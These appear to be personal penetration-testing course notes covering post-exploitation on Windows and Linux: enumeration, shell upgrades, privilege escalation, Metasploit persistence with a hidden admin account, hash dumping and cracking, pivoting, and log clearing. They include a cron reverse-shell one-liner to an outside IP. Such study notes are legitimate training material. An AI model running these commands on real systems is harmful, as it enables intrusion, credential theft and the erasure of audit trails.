- [ ] Windows Local Enumeration
- [ ] Linux Local Enumeration
- [ ] Transferring Files To Windows & Linux Targets
- [ ] Upgrading Shells
- [ ] Windows Privilege Esclation
- [ ] Linux Privilege Esclation
- [ ] Windows Persistence 
- [ ] Dumping & Cracking Windows Hashes
- [ ] Dumping & Cracking Linux Hashes
- [ ] Pivoting
- [ ] Clearing Your Tracks

---

## Windows Enumeration

> Important Things
> 	Hostname
> 	OS Name
> 	OS Build and Service Pack
> 	OS Architecture
> 	Installed updated/Hotfixes

> commands:
> 	MSF:
> 		getuid
> 		sysinfo
> 	hostname
> 	systeminfo
> 	wmic qfe get Caption,Description,HotFixID,InstalledON
> 	.
> 	C:\\Windows\System32\eulta.txt
> 	
---

## Enumerating Users & Groups

> Important Things
> 	Current user & privileges
> 	Additional user information
> 	Other users on the system
> 	Groups
> 	Members of the Built-in administrator group

> getprivs
> post/windows/gather/enum_logged_on_users
> whoami
> whoami /priv
> query user // currently logged on users
> net users / all other users
> net user Administrator
> net localgroup
> net localgroup administrators
---

## Enumerating Networking Information

> Important Things
> 	Current IP address & Network Adapter
> 	Internal Networks
> 	TCP/UCP services running and their respective ports
> 	Other hosts on the network
> 	Routing Table
> 	Windows Firewall State

> Commands:
> 	ipconfig
> 	ipconfig /all
> 	route print // Check for interesting routes
> 	arp -a // list of all devices with mac addess, 
> 	netstat -ano
> 	netsh firewall show state
> 		netsh advfirewall firewall
> 		netsh advfirewall show allprofiles
> 		

---

## Enumerating Processes & Services

> Important Things
> 	Running Processes & Services
> 	Scheduled Tasks
> 	 	Services are like background and processes like when we open something
> 	 MSF: 
> 		 ps
> 		 pgrep explorer.exe // this will give the PID
> 		 migrate 8989
> 		 


> Standard Services:
> 	net start // will list the services
> 	wmic service list brief // disply runing serivces in good format with state
> 		
> 	tasklist /svc // this will list the procces running ,
> 		provide list of processes with the services being used by processes 

> schtasks /query /fo LIST /v 
> 	Scheduled Tasks

---

## Automating Windows Local Enumeration

> JAWS - Just Another Windows Enum Script
> 	411Hall/jaws
> 	We need to copy from our machines to the VM
> 	CTRL+Shift+ALt
> 	powershell.exe -ExecutionPolicy Bypass -File .\jaw.ps1 -OutputFilename JAWS-enum.txt 
> when using msf for winrm shell, set FORCE_VBS true
> show_mounts
> post/windows/gather/win_privs
> enum_applications

> enum_computers
> enum_pathes
---

## Linux Enumeration

> Important Things
> 	Hostname
> 	Distribution and Distribution release version
> 	Kernal version and Architecture
> 	CPU information
> 	Disk information and mounted drives
> 	Installed packages / software

> Commands:
> 	hostname
> 	cat /etc/issue
> 	cat /etc/*release* 
> 	uname -a 
> 	uname -r / Kernel version
> 	env
> 	lscpu / Architecture
> 	free -h / Ram
> 	df -h
> 	df -ht ext4
> 	lsblk | grep sd
> 	dpkg -l

---
## Enumerating Users and Groups

> Commands
> 	groups userName
> 	cat /etc/passwd
> 	useradd bob -s /bin/bash
> 		This will not create a home directory, 
> 	useradd -m john -s /bin/bash
> 		This will create .
> 	usermod -aG root bob
> 		root is group name
> 		bob is the username
> 		-aG  means add to group
> 	w , who, last
> 	lastlog

---

## Enumerating Network Information

> MSF
> 	ifconfig
> 	netstat
> 	route
> 	arp / MSF module works, when we dont have arp command inside shell.
> ip a s / works everytime
> cat /etc/networks
> cat /etc/hostname
> cat /etc/hosts
> cat /etc/resolv.conf
> arp -a 

----
## Enumerating Proceses And Cron Jobs

> MSF
> 	ps
> 	pgrep vsftpd
> Shell
> 	ps aux
> 	top or htop
> 	crontab -l
> 	ls -al /etc/cron
> 	

----
## Automating Linux Local Enumeration

> rebootuser/LinEnum
> 	
> linux/gather/enum_configs
> linux/gather/enum_network
> linux/gather/enum_system
> 

---

## Transferring Files To Target Systems

> Nothing he just explained Netcat

----
## Upgrading Non-Interactive Shells

> /bin/bash -i
> cat /etc/shell
> python -c 'import pty;pty.spawn("/bin/bash")'
> perl -e 'exec "/bin/bash";'
> ruby: exec "/bin/bash"
> perl: exec "/bin/bash";
> env
> sometime the important binaries are not specifired inside env, 
> 	export PATH=/usr/local/sbin:/usr/local/bin blash blash
> 	export SHELL=bash
> 	ls -alps
> 	

---

##  Windows Privilege Esclation

> Identifying Windows Privilege Esclation Vulnerabilites
> 	itm4n/PrivescCheck
> exploit/multi/script/web_delivery
> 	Starts webserver
> 	Copy that code,
> 	set target to PSH binary
> 	set payload to windows/shell/reverse_tcp
> 	migrate to x64

---

## Linux PE

> whoami
> groups
> cat /etc/group
> groups userName
> find / -not -type l -perm -o+w
> 	modify the shadhow file
> 	openssl passwd -1 -salt abc password

---
## Persistence Via Services

> Used Metasploit for Exploiting and also for Persistence
> 	exploit/windows/local/persistence_service
> 	(Services run in the background)
> 		this creates also a RC Files , for clean up , which will clean all the artifacts left over.
>  
> Via RDP and Creating USER
> 	run getgui -e -u alexis -p hacker_123321
> 		Check, if rdp is enabled, if not it will enable it. then create the user and then remove from the windows login screen, and add the user to local group administrators
> 		Also this will give the clean up script.
> 		now use xfreerdp and connect to that system.
> 		
---

## Linux Persistence - Via SSH keys

> Just the concept of SSH keys
> 	but in the lab, it was tottally oppostie, bcoz, i stoled the private key, and i didn't had permission of editing authorized_keys

> Via cron jobs
> 	cat /cron*
> 	echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/6969 0>&1' " 
> 	crontab -i cron, cron is the txt file ,with the echo commands, 
> 	crontab -l
> 	

---

## Dumping & Cracking NTLM Hashes

> Window stored hashed user accound password in the SAM databases.
> Yeah, we need that LSASS Process, also root privs 
> 	When we run the Recovery utility in windows, a copy is made , which needs to be deleted manually
> 	It stores the hashs , like in a cache, 
> 	After the user is create, MD4 is created, and the pass is disposed.
> 	hashdump
> 	just copy and paste the way it is, 
> 	john --list=formats
> 	john --format=NT hash.txt --wordlist=/yo/bruh/whatup
> 	gzip -d /usr/share/rockyou
> 	hashcat -a 3 -m 1000 hashes.txt --wordlist /usr/share/rockyou

## Dumping hashes in Linux

>  He Used the ProFTPd 1.3.3c , and it has a Backdoor command execution
>  cat /etc/shadow
> 	 the hash is shodowed, 
> 	 he used msf to get the unshadow

> linux/gather/hashdump
> 	john --format=sha512crypt pathtofile --wordlist pathtowordlist
> 	hashcat --help | grep sha512crypt
> 	hashcat -a3 -m 1800 

| Value | Algo     |
| ----- | -------- |
| $1    | MD5      |
| $2    | Blowfish |
| $5    | SHA-246  |
| $6    | SHA-512  |


---

## Pivoting

>  run autoroute -a 10.0.29.0/20
> 	 run autoroute -p
> 	 scanner/portscan/tcp
> 	 set ports 1-100
> 	 portfwd add -l 6969 -p 80 -r IpOfThatSystem
> 	 we can't use reverse tcp, so we will use bind tcp
> 	 

---
## Clearing Your Tracks On Windows

> inside MSF:
> 	show advanced
> 	show info
> 	when we get a RC cleanup file, 
> 		we can run inside the meterpreter> session, jus by typing
> 		meterpreter> resource path/to/that.rc
> 		clearev

---
## Clearing Your Tracks on Linux

> history
> touch .bash_history
> history -c / delete the history
> cat /dev/null > .bash_history
> 
---
